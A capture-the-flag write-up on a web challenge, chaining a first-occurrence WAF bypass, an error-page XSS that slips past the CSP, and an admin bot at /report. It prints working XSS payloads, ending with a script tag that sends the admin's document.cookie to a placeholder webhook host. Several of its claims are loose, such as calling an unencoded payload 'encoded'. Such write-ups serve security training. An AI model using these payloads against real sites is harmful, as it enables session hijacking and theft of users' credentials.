## Challenge Writeup: CSP Bypass, WAF Restriction, and XSS Exploitation

### Summary of the Challenge
The web application presented a series of vulnerabilities, including:

1. **Strict Content Security Policy (CSP):** While the CSP was configured to restrict content sources, a bypass was possible due to exploitable behaviors.
2. **/report Endpoint Vulnerability:** A `/report` endpoint accepted a `url` parameter and visited the URL, potentially enabling SSRF and other attacks.
3. **Error Page XSS:** The application’s error page rendered arbitrary input as HTML with a `200 OK` status instead of a proper `404 Not Found`, leading to an XSS vulnerability.
4. **Basic Web Application Firewall (WAF):** A WAF was in place to block payloads containing the first occurrences of `<`, `>`, `"`, `'`, and `` ` ``, introducing additional challenges in crafting exploit payloads.

---

### Observations and Findings

1. **Strict CSP:**
   - The application implemented a CSP allowing only self-hosted resources (`default-src 'self'`). Inline styles (`unsafe-inline`) were permitted, but inline scripts were blocked.
   - Despite these restrictions, misconfigurations/Quirks in the application left room for bypasses.

2. **/report Endpoint:**
   - The `/report` endpoint accepted a `url` parameter and triggered a server-side visit to the specified URL.
   - This endpoint introduced opportunities for server-side request forgery (SSRF) or leveraging the bot to trigger client-side vulnerabilities.

3. **Error Page Vulnerability:**
   - Accessing an invalid path returned a `200 OK` status and rendered the requested path as `text/html`.
   - This behavior allowed for reflective XSS by injecting scripts or malicious HTML into the path.

4. **WAF Restrictions:**
   - The WAF blocked the first occurrence of specific special characters, such as `<`, `>`, `"`, `'`, and `` ` ``.
   - Crafting payloads required creative encoding or avoidance strategies to bypass these restrictions.

---

### Exploitation Process

#### **Step 1: Bypassing the WAF**
To bypass the WAF restrictions:
   - Used encoded characters or alternate representations of blocked characters.
   - For example, the character `<` could be replaced with its HTML entity (`&#60;`) or omitted in favor of alternative scripting techniques.

#### **Step 2: XSS via Error Page**
The error page’s behavior allowed a crafted URL like the following to execute arbitrary JavaScript:

```
http://example.com/x/;console.log()//
```

With the WAF in place, the payload was adjusted to bypass the restrictions:

```
<`"'><script src="/x/;alert(1)//"></script>
```

This encoded payload successfully executed JavaScript while circumventing WAF checks.


Once you get he xss you can just directly send it to the admin which is sitting on /report?url=<url>

	```
	<>"'`<script src="/x/;location.href='<webhook>/'+encodeURI(document.cookie);//"></script>
	```

You can steal the cookie of the admin which ends up being the flag and hence challenge completed